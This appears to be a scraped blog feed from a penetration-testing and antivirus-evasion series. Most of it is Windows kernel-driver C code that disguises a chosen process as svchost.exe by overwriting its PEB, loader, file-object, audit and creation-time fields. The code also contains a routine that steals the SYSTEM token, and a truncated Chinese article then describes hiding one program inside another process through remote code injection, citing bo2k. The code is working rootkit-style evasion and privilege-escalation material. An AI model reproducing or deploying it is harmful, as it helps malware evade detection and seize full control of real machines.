/*0x030*/     struct _LIST_ENTRY InInitializationOrderModuleList; // 2 elements, 0x10 bytes (sizeof)     /*0x040*/     VOID*        EntryInProgress;    /*0x048*/     UINT8        ShutdownInProgress;    /*0x049*/     UINT8        _PADDING1_[0x7];    /*0x050*/     VOID*        ShutdownThreadId;}PEB_LDR_DATA, *PPEB_LDR_DATA;typedef struct _PEB                                                                               // 91 elements, 0x380 bytes (sizeof) {    /*0x000*/     UINT8        InheritedAddressSpace;    /*0x001*/     UINT8        ReadImageFileExecOptions;    /*0x002*/     UINT8        BeingDebugged;    union                                                                                         // 2 elements, 0x1 bytes (sizeof)      {        /*0x003*/         UINT8        BitField;        struct                                                                                    // 6 elements, 0x1 bytes (sizeof)          {            /*0x003*/             UINT8        ImageUsesLargePages : 1;                                                 // 0 BitPosition                           /*0x003*/             UINT8        IsProtectedProcess : 1;                                                  // 1 BitPosition                           /*0x003*/             UINT8        IsLegacyProcess : 1;                                                     // 2 BitPosition                           /*0x003*/             UINT8        IsImageDynamicallyRelocated : 1;                                         // 3 BitPosition                           /*0x003*/             UINT8        SkipPatchingUser32Forwarders : 1;                                        // 4 BitPosition                           /*0x003*/             UINT8        SpareBits : 3;                                                           // 5 BitPosition                       };    };    /*0x008*/     VOID*        Mutant;    /*0x010*/     VOID*        ImageBaseAddress;    /*0x018*/     struct _PEB_LDR_DATA* Ldr;    /*0x020*/     struct _RTL_USER_PROCESS_PARAMETERS* ProcessParameters;}PEB, *PPEB;/*+0x2e0 ImageFileName    : [15]  "explorer.exe"0: kd&gt; dt _SE_AUDIT_PROCESS_CREATION_INFO fffffa80037a7b30+0x390nt!_SE_AUDIT_PROCESS_CREATION_INFO+0x000 ImageFileName    : 0xfffffa80`037a89b0 _OBJECT_NAME_INFORMATION0: kd&gt; dt 0xfffffa80`037a89b0 _OBJECT_NAME_INFORMATIONnt!_OBJECT_NAME_INFORMATION+0x000 Name             : _UNICODE_STRING "\Device\HarddiskVolume1\Windows\explorer.exe"PEB ProcessParameters+0x060 ImagePathName    : _UNICODE_STRING "C:\Windows\Explorer.EXE"+0x070 CommandLine      : _UNICODE_STRING "C:\Windows\Explorer.EXE"+0x080 Environment      : 0x00000000`02932eb0 Void+0x088 StartingX        : 0+0x08c StartingY        : 0+0x090 CountX           : 0+0x094 CountY           : 0+0x098 CountCharsX      : 0+0x09c CountCharsY      : 1+0x0a0 FillAttribute    : 0x175+0x0a4 WindowFlags      : 1+0x0a8 ShowWindowFlags  : 1+0x0b0 WindowTitle      : _UNICODE_STRING "C:\Windows\Explorer.EXE"+0x0c0 DesktopInfo      : _UNICODE_STRING "Winsta0\Default"+0x0d0 ShellInfo        : _UNICODE_STRING "C:\Windows\Explorer.EXE"InLoadOrderModuleList InMemoryOrderLinks是同一片内存区域(前者+0x10就是后者 只需要改一个地方就行 最好前者)*/WCHAR* g_szTarSeAuditProcessName = NULL;WCHAR* g_szTarPebFullName = NULL;WCHAR* g_szTarPebBaseName = NULL;WCHAR* g_szTarFileObjectName = NULL;WCHAR* g_szTarPebCurrentDir = NULL;WCHAR* g_szTarWin10ImageFilePointerName = NULL; //offset 0x448LARGE_INTEGER g_TarCreateTime = { 0 };ULONG_PTR g_TarInheritedFromUniqueProcessId = 0;// 获取被伪装的进程的一些信息NTSTATUS PsGetTarProcessInfo(HANDLE pid){    // SE_AUDIT_PROCESS_CREATION_INFO    // PEB ProcessParameters    // PEB Ldr    PPEB peb = NULL;    PLDR_DATA_TABLE_ENTRY ldr = NULL;    PEPROCESS Process = NULL;    NTSTATUS status = STATUS_UNSUCCESSFUL;    PUNICODE_STRING SeAuditName = NULL;    PUNICODE_STRING SelocateName = NULL;    PFILE_OBJECT pFileObject = NULL;    status = PsLookupProcessByProcessId(pid, &amp;Process);    if (!NT_SUCCESS(status))        return status;    g_TarCreateTime.QuadPart = PsGetProcessCreateTimeQuadPart(Process);    g_TarInheritedFromUniqueProcessId = PsGetProcessInheritedFromUniqueProcessId(Process);    if (*NtBuildNumber &gt; 9600)    {        g_szTarWin10ImageFilePointerName = ExAllocatePool(NonPagedPool, KMAX_PATH * 2);        if (g_szTarWin10ImageFilePointerName == NULL)            return STATUS_NO_MEMORY;        RtlZeroMemory(g_szTarWin10ImageFilePointerName, KMAX_PATH * 2);    }    if (g_szTarPebBaseName == NULL)        g_szTarPebBaseName = ExAllocatePool(NonPagedPool, MAX_PATH * 2);    if (g_szTarPebFullName == NULL)        g_szTarPebFullName = ExAllocatePool(NonPagedPool, MAX_PATH * 2);    if (g_szTarSeAuditProcessName == NULL)        g_szTarSeAuditProcessName = ExAllocatePool(NonPagedPool, KMAX_PATH * 2);    if(g_szTarFileObjectName == NULL)        g_szTarFileObjectName = ExAllocatePool(NonPagedPool, KMAX_PATH * 2);    if (g_szTarPebCurrentDir == NULL)        g_szTarPebCurrentDir = ExAllocatePool(NonPagedPool, KMAX_PATH * 2);    if (g_szTarPebBaseName &amp;&amp; g_szTarPebFullName &amp;&amp; g_szTarSeAuditProcessName &amp;&amp; g_szTarFileObjectName &amp;&amp; g_szTarPebCurrentDir)    {        RtlZeroMemory(g_szTarPebBaseName, MAX_PATH * 2);        RtlZeroMemory(g_szTarPebFullName, MAX_PATH * 2);        RtlZeroMemory(g_szTarSeAuditProcessName, KMAX_PATH * 2);        RtlZeroMemory(g_szTarFileObjectName, KMAX_PATH * 2);        RtlZeroMemory(g_szTarPebCurrentDir, KMAX_PATH * 2);        if (!NT_SUCCESS(SeLocateProcessImageName(Process, &amp;SelocateName)))            return STATUS_UNSUCCESSFUL;        ExFreePool(SelocateName);        if (!NT_SUCCESS(PsReferenceProcessFilePointer(Process, &amp;pFileObject)))            return STATUS_UNSUCCESSFUL;        RtlCopyMemory(g_szTarFileObjectName, pFileObject-&gt;FileName.Buffer, pFileObject-&gt;FileName.Length);        ObDereferenceObject(pFileObject);        if (*NtBuildNumber &gt; 9600)        {            pFileObject = (PFILE_OBJECT)(*(PULONG_PTR)((ULONG_PTR)Process + 0x448)); //+0x448 ImageFilePointer             if (!MmIsAddressValid(pFileObject))            {                ObDereferenceObject(Process);                return STATUS_UNSUCCESSFUL;            }            RtlCopyMemory(g_szTarWin10ImageFilePointerName, pFileObject-&gt;FileName.Buffer, pFileObject-&gt;FileName.Length);        }        if(*NtBuildNumber &lt; 9600)            SeAuditName = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x390)); // win7 offset         else            SeAuditName = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x468)); // win10 offset 14393 15063 16299        if (!MmIsAddressValid(SeAuditName))        {            ObDereferenceObject(Process);            return STATUS_UNSUCCESSFUL;        }        RtlCopyMemory(g_szTarSeAuditProcessName, SeAuditName-&gt;Buffer, SeAuditName-&gt;Length);        peb = PsGetProcessPeb(Process);        KeAttachProcess(Process);        __try {            RtlCopyMemory(g_szTarPebFullName, peb-&gt;ProcessParameters-&gt;ImagePathName.Buffer, peb-&gt;ProcessParameters-&gt;ImagePathName.Length);            ldr = (PLDR_DATA_TABLE_ENTRY)peb-&gt;Ldr-&gt;InLoadOrderModuleList.Flink;            RtlCopyMemory(g_szTarPebBaseName, ldr-&gt;BaseDllName.Buffer, ldr-&gt;BaseDllName.Length);            RtlCopyMemory(g_szTarPebCurrentDir, peb-&gt;ProcessParameters-&gt;CurrentDirectory.DosPath.Buffer, peb-&gt;ProcessParameters-&gt;CurrentDirectory.DosPath.Length);            status = STATUS_SUCCESS;        }        __except (1)        {        }        KeDetachProcess();    }    else    {        status = STATUS_NO_MEMORY;    }    ObDereferenceObject(Process);    return status;}BOOLEAN PathWin10ImageNamePoint(PEPROCESS Process, WCHAR* szFullName){    BOOLEAN bRet = FALSE;    PFILE_OBJECT pFileObject = NULL;    WCHAR* szNewFullName = NULL;    if (szFullName == NULL || Process == NULL)        return FALSE;    szNewFullName = ExAllocatePool(NonPagedPool, KMAX_PATH * 2);    if (szNewFullName == NULL)        return FALSE;    RtlZeroMemory(szNewFullName, KMAX_PATH * 2);    pFileObject = (PFILE_OBJECT)(*(PULONG_PTR)((ULONG_PTR)Process + 0x448)); //+0x448 ImageFilePointer     if (!MmIsAddressValid(pFileObject))    {        ExFreePool(szNewFullName);        return FALSE;    }    if (pFileObject-&gt;FileName.Length &gt;= wcslen(szFullName) * 2)    {        RtlZeroMemory(pFileObject-&gt;FileName.Buffer, pFileObject-&gt;FileName.MaximumLength);        RtlCopyMemory(pFileObject-&gt;FileName.Buffer, szFullName, wcslen(szFullName) * 2);        pFileObject-&gt;FileName.Length = wcslen(szFullName) * 2;        ExFreePool(szNewFullName);        bRet = TRUE;    }    else    {        RtlCopyMemory(szNewFullName, szFullName, wcslen(szFullName) * 2);        pFileObject-&gt;FileName.Buffer = szNewFullName;        pFileObject-&gt;FileName.Length = wcslen(szFullName) * 2;        pFileObject-&gt;FileName.MaximumLength = KMAX_PATH * 2;        bRet = TRUE;    }    return bRet;}BOOLEAN PathSeFileObject(PEPROCESS Process, WCHAR* szFullName){    BOOLEAN bRet = FALSE;    PFILE_OBJECT pFileObject = NULL;    WCHAR* szNewFullName = NULL;    if (szFullName == NULL || Process == NULL)        return FALSE;    szNewFullName = ExAllocatePool(NonPagedPool, KMAX_PATH * 2);    if (szNewFullName == NULL)        return FALSE;    RtlZeroMemory(szNewFullName, KMAX_PATH * 2);    if (!NT_SUCCESS(PsReferenceProcessFilePointer(Process, &amp;pFileObject)))        return FALSE;    if (pFileObject-&gt;FileName.Length &gt;= wcslen(szFullName) * 2)    {        RtlZeroMemory(pFileObject-&gt;FileName.Buffer, pFileObject-&gt;FileName.MaximumLength);        RtlCopyMemory(pFileObject-&gt;FileName.Buffer, szFullName, wcslen(szFullName) * 2);        pFileObject-&gt;FileName.Length = wcslen(szFullName) * 2;        ExFreePool(szNewFullName);        bRet = TRUE;    }    else    {        RtlCopyMemory(szNewFullName, szFullName, wcslen(szFullName) * 2);        pFileObject-&gt;FileName.Buffer = szNewFullName;        pFileObject-&gt;FileName.Length = wcslen(szFullName) * 2;        pFileObject-&gt;FileName.MaximumLength = KMAX_PATH * 2;        bRet = TRUE;    }    ObDereferenceObject(pFileObject);    return bRet;}BOOLEAN PathPebLdr(PEPROCESS Process, WCHAR* szFullName, WCHAR* szBaseName){    PPEB peb = NULL;    BOOLEAN bRet = FALSE;    BOOLEAN bAttach = FALSE;    PLDR_DATA_TABLE_ENTRY ldr = NULL;    if (Process == NULL || szFullName == NULL || szBaseName == NULL)        return FALSE;    do    {        peb = PsGetProcessPeb(Process);        if (peb == NULL)            break;        KeAttachProcess(Process);        bAttach = TRUE;        __try {            ldr = (PLDR_DATA_TABLE_ENTRY)peb-&gt;Ldr-&gt;InLoadOrderModuleList.Flink;            if (!MmIsAddressValid(ldr))                break;            if (ldr-&gt;FullDllName.Length &lt; wcslen(szFullName) * 2)                break;            if (ldr-&gt;BaseDllName.Length &lt; wcslen(szBaseName) * 2)                break;            RtlZeroMemory(ldr-&gt;FullDllName.Buffer, ldr-&gt;FullDllName.MaximumLength);            RtlCopyMemory(ldr-&gt;FullDllName.Buffer, szFullName, wcslen(szFullName) * 2);            RtlZeroMemory(ldr-&gt;BaseDllName.Buffer, ldr-&gt;BaseDllName.MaximumLength);            RtlCopyMemory(ldr-&gt;BaseDllName.Buffer, szBaseName, wcslen(szBaseName) * 2);            bRet = TRUE;        }        __except (1)        {        }    } while (FALSE);    if (bAttach)        KeDetachProcess();    return bRet;}BOOLEAN PathPebProcessParameters(PEPROCESS Process, WCHAR* szFullName){    BOOLEAN bRet = FALSE;    BOOLEAN bAttach = FALSE;    PPEB Peb = NULL;    if (Process == NULL || szFullName == NULL)        return FALSE;    do    {        Peb = PsGetProcessPeb(Process);        if (Peb == NULL)            break;        KeAttachProcess(Process);        bAttach = TRUE;        __try {            if (Peb-&gt;ProcessParameters-&gt;ImagePathName.Length &lt; wcslen(szFullName) * 2)                break;            RtlZeroMemory(Peb-&gt;ProcessParameters-&gt;ImagePathName.Buffer, Peb-&gt;ProcessParameters-&gt;ImagePathName.MaximumLength);            RtlCopyMemory(Peb-&gt;ProcessParameters-&gt;ImagePathName.Buffer, szFullName, wcslen(szFullName) * 2);            RtlZeroMemory(Peb-&gt;ProcessParameters-&gt;CommandLine.Buffer, Peb-&gt;ProcessParameters-&gt;CommandLine.MaximumLength);            RtlCopyMemory(Peb-&gt;ProcessParameters-&gt;CommandLine.Buffer, szFullName, wcslen(szFullName) * 2);            if (Peb-&gt;ProcessParameters-&gt;WindowTitle.Length &gt;= wcslen(szFullName) * 2)            {                RtlZeroMemory(Peb-&gt;ProcessParameters-&gt;WindowTitle.Buffer, Peb-&gt;ProcessParameters-&gt;WindowTitle.MaximumLength);                RtlCopyMemory(Peb-&gt;ProcessParameters-&gt;WindowTitle.Buffer, szFullName, wcslen(szFullName) * 2);            }            if (Peb-&gt;ProcessParameters-&gt;ShellInfo.Length &gt;= wcslen(szFullName) * 2)            {                RtlZeroMemory(Peb-&gt;ProcessParameters-&gt;ShellInfo.Buffer, Peb-&gt;ProcessParameters-&gt;ShellInfo.MaximumLength);                RtlCopyMemory(Peb-&gt;ProcessParameters-&gt;ShellInfo.Buffer, szFullName, wcslen(szFullName) * 2);            }            if (Peb-&gt;ProcessParameters-&gt;CurrentDirectory.DosPath.Length &gt;= wcslen(g_szTarPebCurrentDir) * 2)            {                RtlZeroMemory(Peb-&gt;ProcessParameters-&gt;CurrentDirectory.DosPath.Buffer, Peb-&gt;ProcessParameters-&gt;CurrentDirectory.DosPath.MaximumLength);                RtlCopyMemory(Peb-&gt;ProcessParameters-&gt;CurrentDirectory.DosPath.Buffer, g_szTarPebCurrentDir, wcslen(g_szTarPebCurrentDir) * 2);            }            bRet = TRUE;        }        __except (1)        {        }    } while (FALSE);    if(bAttach)        KeDetachProcess();    return bRet;}// 这里的ProcessName 为全路径 \Device\HarddiskVolume1\Windows\explorer.exe 这里使用GetTarProcessInfo去获取即可BOOLEAN PathSeAuditProcessCreationInfo(PEPROCESS Process, WCHAR* ProcessName){    PUNICODE_STRING Name = NULL;    PUNICODE_STRING SelocateName = NULL;    if (Process == NULL || ProcessName == NULL)        return FALSE;    if (!NT_SUCCESS(SeLocateProcessImageName(Process, &amp;SelocateName)))        return FALSE;    ExFreePool(SelocateName);    if(*NtBuildNumber &lt; 9600)        Name = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x390));    else        Name = (PUNICODE_STRING)(*(PULONG_PTR)((ULONG_PTR)Process + 0x468));    if (!MmIsAddressValid(Name))        return FALSE;    if ((wcslen(ProcessName) * 2) &gt; Name-&gt;Length)    {        return FALSE;    }    RtlZeroMemory(Name-&gt;Buffer, Name-&gt;MaximumLength);    RtlCopyMemory(Name-&gt;Buffer, ProcessName, wcslen(ProcessName) * 2);    Name-&gt;Length = wcslen(ProcessName) * 2;    return TRUE;}// cName15字节的大小 分配内存时注意要大于15BOOLEAN PathImageFileName(PEPROCESS Process, char* cName){    char    szNameBuff[15] = { 0 };    char*   szProcessBuff = NULL;    size_t  cNamelen = 0;    if (Process == NULL || cName == NULL)        return FALSE;    cNamelen = strlen(cName);    RtlZeroMemory(szNameBuff, sizeof(szNameBuff));    if(cNamelen &gt; 15)        RtlCopyMemory(szNameBuff, cName, sizeof(szNameBuff));    else        RtlCopyMemory(szNameBuff, cName, cNamelen);    szProcessBuff = PsGetProcessImageFileName(Process);    RtlZeroMemory(szProcessBuff, sizeof(szNameBuff));    RtlCopyMemory(szProcessBuff, szNameBuff, sizeof(szNameBuff));    return TRUE;}PACCESS_TOKEN GetProceesTokenAddress(ULONG_PTR Address){    //    // To get an address of a token from the Token field in EPROCESS, the lowest    // N bits where N is size of a RefCnt field needs to be masked.    //    // kd&gt; dt nt!_EX_FAST_REF    //   + 0x000 Object : Ptr64 Void    //   + 0x000 RefCnt : Pos 0, 4 Bits    //   + 0x000 Value  : Uint8B    //    ULONG_PTR Value = *(ULONG_PTR*)(Address);    return (PACCESS_TOKEN)(Value &amp; ((ULONG_PTR)(~0xf)));}BOOLEAN PathToken(PEPROCESS Process){    PACCESS_TOKEN CurrentToken = NULL;    PACCESS_TOKEN SystemToken = NULL;    BOOLEAN bRet = FALSE;    CurrentToken = PsReferencePrimaryToken(Process);    SystemToken = PsReferencePrimaryToken(PsInitialSystemProcess);    for (auto Offset = 0ul; Offset &lt; sizeof(void *) * 0x80;        Offset += sizeof(void *))    {        // Is this address stores token?        ULONG_PTR TestAddress = (ULONG_PTR)Process + Offset;        PACCESS_TOKEN ProbableToken = GetProceesTokenAddress(TestAddress);        if (ProbableToken == CurrentToken)        {            // Found the field, replace the contents with the SYSTEM token            PACCESS_TOKEN* TokenAddress = (PACCESS_TOKEN*)(TestAddress);            *TokenAddress = SystemToken;            bRet = TRUE;            break;        }    }    //ULONG_PTR TestAddress = (ULONG_PTR)Process + 0x358;    //PACCESS_TOKEN ProbableToken = GetProceesTokenAddress(TestAddress);    //if (ProbableToken == CurrentToken)    //{    //    // Found the field, replace the contents with the SYSTEM token    //    PACCESS_TOKEN* TokenAddress = (PACCESS_TOKEN*)(TestAddress);    //    *TokenAddress = SystemToken;    //    bRet = TRUE;    //}    PsDereferencePrimaryToken(CurrentToken);    PsDereferencePrimaryToken(SystemToken);    return bRet;}BOOLEAN PathCreateTime(PEPROCESS Process){    ULONG offset = 0;    offset = *(PULONG)((ULONG_PTR)PsGetProcessCreateTimeQuadPart + 3);    if (offset)    {        *(LARGE_INTEGER*)((ULONG_PTR)Process + offset) = g_TarCreateTime;        return TRUE;    }    return FALSE;}BOOLEAN PathInheritedFromUniqueProcessId(PEPROCESS Process){    ULONG offset = 0;    offset = *(PULONG)((ULONG_PTR)PsGetProcessInheritedFromUniqueProcessId + 3);    if (offset)    {        *(ULONG_PTR*)((ULONG_PTR)Process + offset) = g_TarInheritedFromUniqueProcessId;        return TRUE;    }    return FALSE;}BOOLEAN PathModification(HANDLE pid){    HANDLE SvchostPid = NULL;    PEPROCESS Process = NULL;    //DbgBreakPoint();    // 不支持x86进程    if (!PsIs64BitProcess(pid))        return FALSE;    SvchostPid = (HANDLE)PsGetProcesIdBitByName("svchost.exe", TRUE);    if (SvchostPid == NULL)        return FALSE;    if (!NT_SUCCESS(PsGetTarProcessInfo(SvchostPid)))        return FALSE;    if (!NT_SUCCESS(PsLookupProcessByProcessId(pid, &amp;Process)))        return FALSE;    PathSeFileObject(Process, g_szTarFileObjectName);    if (*NtBuildNumber &gt; 9600)        PathWin10ImageNamePoint(Process, g_szTarWin10ImageFilePointerName);    PathImageFileName(Process, "svchost.exe");    PathSeAuditProcessCreationInfo(Process, g_szTarSeAuditProcessName);    PathPebProcessParameters(Process, g_szTarPebFullName);    PathPebLdr(Process, g_szTarPebFullName, g_szTarPebBaseName);    //PathToken(Process);    PathCreateTime(Process);    PathInheritedFromUniqueProcessId(Process);    ObDereferenceObject(Process);    return TRUE;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-jin-cheng-ling-lei-wei-suo-da-fa-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.33-jin-cheng-ling-lei-wei-suo-da-fa-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="在同一个进程空间运行两个程序（进程隐藏）"><a href="#在同一个进程空间运行两个程序（进程隐藏）" class="headerlink" title="在同一个进程空间运行两个程序（进程隐藏）"></a>在同一个进程空间运行两个程序（进程隐藏）</h2><p>在同一个进程空间运行两个程序 运行环境：Windows NT4.0 / Windows 2000 关键字：进程隐藏，API 截获，映像加载</p><p>众所周知，bo2k 可以在一个指定的进程空间（比如 explorer.exe 进程）做为一个线程运行。 本文试图找出一种方法，使得任意 exe 都可以在其他进程中以线程运行（当然，这里说的 “任意” 是有条件的，下面会讲到）。 为行文简单起见，我把先加载的 exe 称为宿主，后加载的 exe 称为客户。对于上面的例子，explorer.exe 为宿主，bo2k.exe 为客户。</p><p>基本知识<br>每一个 exe 都有一个缺省加载基址，一般都是 0x400000。 如果实际加载基址和缺省基址相同，程序中的重定位表就不需要修正（fixup），否则，就必须修正重定位表； 如果一个程序没有重定位表，而且如果程序不能在缺省基址处加载，那么程序将不能运行。 举个例子，Windows95 的最低加载基址是 0x400000，你在 Windows NT 上开发了一个 exe，指定其加载基址为 0x10000，如果连接时让连接器剥离重定位表，那么他将无法在 Windows95 下运行。</p><p>bo2k 为了避免和普通程序冲突，选了一个极其特殊的基址：0x03140000，这个地址一般不会有程序用到。 这样 bo2k 启动后，用 WriteProcessMemory 将自身复制到宿主进程的 0x03140000 地址处， 再用 CreateRemoteThread 远程启动一个线程，从入口点开始执行。</p><p>bo2k 能够在其他进程空间正常运行，关键有两点：</p><p>实际加载基址和缺省基址相同，这样就无需修正重定位表。<br>与 bo2k 隐性联接 (implicitly link) 的动态联接库在目标进程中的加载基址和 bo2k 启动时的加载基址一致，这样就无需修改导入函数表。 除非只用到 ntdll.dll 和 kernel32.dll 两个 dll，否则这点很难保证。<br>bo2k 的解决办法是，远程运行的代码不用隐性调用，所有用到 API 都在远程代码运行后再动态确定（用 LoadLibrary 和 GetProcAddress）。</p><p>我的目标是让 “所有 “ 的程序都能在其他进程空间跑。在这里，”所有 “ 的含义是所有那些 “重定位表没有被剥离” 的 32 位 pe 格式的可执行程序。 对于 Visual C++，这包括所有 Debug 版程序和以 “/FIXED:NO” 选项链接的 Release 版程序。 对于一般的程序，上面两点都很难满足：</p><p>绝大多数程序的加载基址都是 0x400000，这样，客户 exe 就很难保证加载到其缺省基址。解决办法只能是修正重定位表。 如果，很不幸，这个 exe 的重定位表被剥离，这个 exe 就没法在其他进程空间跑。 对于 Visual C++，剥离重定位表是 Release 版 exe 的缺省设置。可以在工程文件的连接选项中加入 “/FIXED:NO” 来防止连接器剥离重定位表。<br>很多程序都用隐性联接调用 Windows API，而只用到 kernel32.dll 导出 API 的程序很少，因此这一点也很难保证。 解决办法是重填导入表 (import table)。<br>另外，对于有界面的程序，光修正重定位表和导入表还不够。因为他们都会直接或间接用到 GetModuleHandle 和 LoadResource 这些函数。 GetModuleHandle 有个特点，如果传递给他的 ModuleName 为 NULL，则返回宿主 exe 的模块句柄。LoadResource 也类似，如果传递给他的模块句柄为 NULL，则认为是宿主 exe 模块，类似的 API 还有一些，不一一列举。 客户 exe 调用这些 API 显然会得到错误的结果。因此必须截获这些 API 做特殊处理。</p><p>综合上面分析，要让两个程序共享一份进程空间，要做的工作有：</p><p>打开进程边界：用 WriteProcessMemory 向宿主进程注入代码，用 CreateRemoteThread 启动远程代码；<br>在远程代码中，加载客户 exe，必要时修正重定位表和填充 dll 导入表。<br>获 GetModuleHandle，LoadResource 等 API，在客户 exe 以缺省参数调用时返回客户 exe 的模块句柄，而不是宿主句柄。<br>根据以上思路，我写了 remote.dll，导出三个函数：RemoteRunA，RemoteRunW，和 RemoteCall。 原型分别为：</p><pre class="line-numbers language-none"><code class="language-none">BOOL WINAPI RemoteRunA( DWORD processId, LPCSTR lpszAppPath, LPCSTR lpszCmdLine, int nCmdShow );BOOL WINAPI RemoteRunW( DWORD processId, LPCWSTR lpszAppPath, LPCWSTR lpszCmdLine, int nCmdShow );BOOL WINAPI RemoteCall( DWORD processId, PVOID pfnAddr, PVOID pParam, DWORD cbParamSize, BOOL fSyncronize );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>RemoteRunA 用于在宿主进程中加载执行客户 exe；<br>RemoteRunW 是 RemoteRunA 的 unicode 版本；<br>RemoteCall 实现远程注入并运行代码。<br>调用例子： 假如宿主 exe 为 Depends.exe（我经常使用的宿主进程），pid 为 136。客户 exe 为 “C:\WINNT\system32\CALC.EXE”，</p><pre class="line-numbers language-none"><code class="language-none">RemoteRunA( 136, "C:\\WINNT\\system32\\CALC.EXE", NULL, SW_SHOW );// 或RemoteRunW( 136, L"C:\\WINNT\\system32\\CALC.EXE", NULL, SW_SHOW );<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>RemoteCall 是一个很 cool 的副产品，可以在任意宿主进程运行一系列你自己精心准备的代码。 远程代码无需特殊处理，就像在本地调用一样。RemoteCall 支持很多特性：</p><p>可以对 Windows API 进行隐性调用（无需用 LoadLibrary 和 GetProcAddress 动态确定）<br>可以使用全局 / 静态变量（除了不能动态初始化）；<br>可以使用编译时数据，特别是字符串常量；<br>支持异常处理；<br>支持源码级调试；<br>支持同步、异步调用；<br>对于同步调用，可以取得返回结果和错误号；<br>对远程代码做了异常保护，代码执行错误不会使宿主进程崩溃。<br>RemoteCall 